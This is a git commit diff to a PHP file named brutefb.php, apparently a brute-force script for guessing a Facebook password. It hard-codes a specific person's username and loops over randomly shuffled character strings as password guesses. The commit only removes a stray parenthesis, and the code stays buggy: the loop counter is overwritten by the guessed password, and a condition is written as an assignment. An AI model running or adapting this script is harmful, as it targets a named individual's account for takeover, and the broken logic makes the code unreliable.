7c0db6ec2c2e49eb4a80b1ce9b07bb60c1271ae9
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-09-15 14:26:16 +0200

    Update brutefb.php

--- brutefb.php
+++ brutefb.php
@@ -6,7 +6,7 @@ $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
     for ($Pass = 1; $Pass < 16; $Pass++) {
-        $Pass = str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"));
+        $Pass = str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
         if(check_correct($username, $Pass)) {
             if ($str = $startpagina) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
